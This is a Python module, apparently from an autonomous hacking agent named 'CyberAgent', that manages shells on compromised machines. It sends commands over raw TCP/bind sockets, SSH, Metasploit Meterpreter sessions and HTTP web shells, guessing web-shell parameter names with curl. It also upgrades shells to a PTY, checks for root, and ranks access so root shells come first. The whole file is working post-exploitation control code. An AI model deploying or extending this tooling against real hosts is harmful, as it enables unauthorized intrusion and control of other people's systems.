"""
Shell Manager — Unified shell object for CyberAgent.

COG06: Provides a consistent Shell class that all agents can use,
replacing raw strings with callable objects that have send_command().

Supports:
- TCP/bind shells (socket)
- SSH shells (paramiko)
- Meterpreter sessions (MSF-RPC)
- HTTP web shells (curl)
"""

import logging
import socket
import subprocess
import time
from typing import Optional, Any

_log = logging.getLogger(__name__)


class Shell:
    """
    Unified shell object for all shell types.
    
    Usage:
        shell = Shell(ip="192.168.1.1", port=4444, protocol="tcp", user="www-data")
        output = shell.send("id")
        print(output)  # "uid=33(www-data)..."
    """
    
    PROTOCOL_TCP = "tcp"
    PROTOCOL_SSH = "ssh"
    PROTOCOL_METERPRETER = "meterpreter"
    PROTOCOL_HTTP = "http"
    
    def __init__(
        self,
        ip: str,
        port: int,
        protocol: str = "tcp",
        user: Optional[str] = None,
        password: Optional[str] = None,
        socket_obj: Optional[socket.socket] = None,
        ssh_client: Any = None,
        msf_session_id: Optional[str] = None,
        http_url: Optional[str] = None,
    ):
        """
        Initialize a Shell object.
        
        Args:
            ip: Target IP address
            port: Shell port (or SSH port, or HTTP port)
            protocol: One of "tcp", "ssh", "meterpreter", "http"
            user: Username (if known)
            password: Password (for SSH)
            socket_obj: Pre-connected socket (for tcp shells)
            ssh_client: Paramiko SSHClient (for ssh)
            msf_session_id: MSF session ID (for meterpreter)
            http_url: Web shell URL (for http)
        """
        self.ip = ip
        self.port = port
        self.protocol = protocol
        self.user = user
        self.password = password
        self._socket = socket_obj
        self._ssh = ssh_client
        self._msf_session_id = msf_session_id
        self._http_url = http_url
        self._connected = False
        
        # Try to establish connection if not provided
        if socket_obj or ssh_client or msf_session_id or http_url:
            self._connected = True
    
    def send(self, cmd: str, timeout: int = 10) -> str:
        """
        Send a command to the shell and return output.
        
        This is the main interface that all shell types implement.
        
        Args:
            cmd: Command to execute
            timeout: Timeout in seconds
        
        Returns:
            Command output as string, or error message
        """
        if not self._connected:
            return f"[SHELL] Not connected to {self.ip}:{self.port}"
        
        if self.protocol == self.PROTOCOL_TCP:
            return self._send_tcp(cmd, timeout)
        elif self.protocol == self.PROTOCOL_SSH:
            return self._send_ssh(cmd, timeout)
        elif self.protocol == self.PROTOCOL_METERPRETER:
            return self._send_meterpreter(cmd, timeout)
        elif self.protocol == self.PROTOCOL_HTTP:
            return self._send_http(cmd, timeout)
        else:
            return f"[SHELL] Unknown protocol: {self.protocol}"
    
    def _send_tcp(self, cmd: str, timeout: int) -> str:
        """Send command via TCP socket."""
        if not self._socket:
            return "[SHELL] No socket connection"
        
        try:
            self._socket.settimeout(timeout)
            self._socket.send(f"{cmd}\n".encode())
            time.sleep(0.5)  # Wait for response
            
            # Read available data
            data = b""
            self._socket.setblocking(False)
            try:
                while True:
                    chunk = self._socket.recv(4096)
                    if not chunk:
                        break
                    data += chunk
            except (socket.error, BlockingIOError):
                pass
            
            self._socket.setblocking(True)
            return data.decode(errors="replace")
            
        except Exception as e:
            _log.warning(f"[Shell] TCP send error: {e}")
            return f"[SHELL] Error: {e}"
    
    def _send_ssh(self, cmd: str, timeout: int) -> str:
        """Send command via SSH."""
        if not self._ssh:
            return "[SHELL] No SSH connection"
        
        try:
            stdin, stdout, stderr = self._ssh.exec_command(cmd, timeout=timeout)
            output = stdout.read().decode(errors="replace")
            errors = stderr.read().decode(errors="replace")
            return output + errors
        except Exception as e:
            _log.warning(f"[Shell] SSH send error: {e}")
            return f"[SHELL] Error: {e}"
    
    def _send_meterpreter(self, cmd: str, timeout: int) -> str:
        """Send command via MSF-RPC."""
        if not self._msf_session_id:
            return "[SHELL] No MSF session"
        
        try:
            from mcp.msf_rpc_client import get_msf_rpc
            msf = get_msf_rpc()
            
            # For meterpreter, use shell command or execute
            if cmd.startswith("shell "):
                # Direct shell access
                actual_cmd = cmd[6:]
                output = msf.interact_with_session(
                    int(self._msf_session_id), 
                    f"execute -f cmd -a '/c {actual_cmd}'" if self._is_windows() else actual_cmd
                )
            else:
                output = msf.interact_with_session(int(self._msf_session_id), cmd)
            
            return output or "[SHELL] No output"
        except Exception as e:
            _log.warning(f"[Shell] Meterpreter send error: {e}")
            return f"[SHELL] Error: {e}"
    
    def _send_http(self, cmd: str, timeout: int) -> str:
        """Send command via HTTP web shell."""
        if not self._http_url:
            return "[SHELL] No HTTP URL"
        
        try:
            import urllib.parse
            encoded_cmd = urllib.parse.quote(cmd)
            
            # Try common web shell parameter patterns
            for param in ["cmd", "c", "command", "exec", "x"]:
                url = f"{self._http_url}?{param}={encoded_cmd}"
                result = subprocess.run(
                    ["curl", "-s", "-k", "--max-time", str(timeout), url],
                    capture_output=True, text=True, timeout=timeout + 2
                )
                if result.stdout and not result.stdout.startswith("<!DOCTYPE"):
                    return result.stdout
            
            return "[SHELL] HTTP shell returned no output"
        except Exception as e:
            _log.warning(f"[Shell] HTTP send error: {e}")
            return f"[SHELL] Error: {e}"
    
    def _is_windows(self) -> bool:
        """Check if target is Windows."""
        # Meterpreter sessions often indicate OS
        return False  # Default to Linux
    
    def is_interactive(self) -> bool:
        """Check if shell is interactive (can execute commands)."""
        test_output = self.send("id", timeout=5)
        return "uid=" in test_output or "Administrator" in test_output
    
    def get_user(self) -> str:
        """Get current user from shell."""
        if self.user and self.user != "unknown":
            return self.user
        
        output = self.send("id", timeout=5)
        import re
        match = re.search(r"uid=\d+\((\w+)\)", output)
        if match:
            self.user = match.group(1)
            return self.user
        
        # Try whoami
        output = self.send("whoami", timeout=5)
        if output and not output.startswith("[SHELL]"):
            self.user = output.strip()
            return self.user
        
        return "unknown"
    
    def is_root(self) -> bool:
        """Check if shell has root/admin privileges."""
        user = self.get_user()
        if user in ("root", "Administrator", "SYSTEM"):
            return True
        
        output = self.send("id", timeout=5)
        return "uid=0" in output or "root" in output.lower()
    
    def upgrade_to_pty(self) -> bool:
        """Attempt to upgrade shell to PTY (for better interactivity)."""
        if self.protocol != self.PROTOCOL_TCP:
            return False
        
        # Python PTY upgrade
        pty_cmd = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
        output = self.send(pty_cmd, timeout=5)
        
        # Verify upgrade
        return "bash" in self.send("echo $SHELL", timeout=5).lower()
    
    def close(self):
        """Close the shell connection."""
        try:
            if self._socket:
                self._socket.close()
            if self._ssh:
                self._ssh.close()
            self._connected = False
        except Exception as e:
            _log.warning(f"[Shell] Close error: {e}")
    
    def to_dict(self) -> dict:
        """Serialize shell to dictionary for storage."""
        return {
            "ip": self.ip,
            "port": self.port,
            "protocol": self.protocol,
            "user": self.user,
            "password": self.password,
            "msf_session_id": self._msf_session_id,
            "http_url": self._http_url,
            "connected": self._connected,
        }
    
    @classmethod
    def from_dict(cls, data: dict) -> "Shell":
        """Create Shell from dictionary."""
        return cls(
            ip=data.get("ip", ""),
            port=data.get("port", 0),
            protocol=data.get("protocol", "tcp"),
            user=data.get("user"),
            password=data.get("password"),
            msf_session_id=data.get("msf_session_id"),
            http_url=data.get("http_url"),
        )
    
    def __repr__(self):
        return f"<Shell {self.protocol}://{self.user or '?'}@{self.ip}:{self.port}>"


class ShellManager:
    """
    Manages multiple shells across a mission.
    
    Usage:
        manager = ShellManager()
        manager.add_shell(shell)
        shell = manager.get_best_shell("192.168.1.1")
    """
    
    def __init__(self):
        self._shells: dict[str, list[Shell]] = {}  # ip -> list of shells
    
    def add_shell(self, shell: Shell) -> None:
        """Add a shell to the manager."""
        ip = shell.ip
        if ip not in self._shells:
            self._shells[ip] = []
        self._shells[ip].append(shell)
        _log.info(f"[ShellManager] Added {shell}")
    
    def get_shells(self, ip: str) -> list[Shell]:
        """Get all shells for an IP."""
        return self._shells.get(ip, [])
    
    def get_best_shell(self, ip: str) -> Optional[Shell]:
        """
        Get the best available shell for an IP.
        
        Priority:
        1. Root SSH shell
        2. Root TCP shell
        3. Any SSH shell
        4. Any TCP shell
        5. Meterpreter
        6. HTTP
        """
        shells = self.get_shells(ip)
        if not shells:
            return None
        
        # Sort by priority
        def priority(s):
            score = 0
            if s.is_root():
                score += 100
            if s.protocol == Shell.PROTOCOL_SSH:
                score += 50
            elif s.protocol == Shell.PROTOCOL_TCP:
                score += 40
            elif s.protocol == Shell.PROTOCOL_METERPRETER:
                score += 30
            elif s.protocol == Shell.PROTOCOL_HTTP:
                score += 10
            return score
        
        shells.sort(key=priority, reverse=True)
        return shells[0]
    
    def has_root(self, ip: str) -> bool:
        """Check if we have root access on an IP."""
        for shell in self.get_shells(ip):
            if shell.is_root():
                return True
        return False
    
    def close_all(self):
        """Close all shells."""
        for ip, shells in self._shells.items():
            for shell in shells:
                shell.close()
        self._shells.clear()
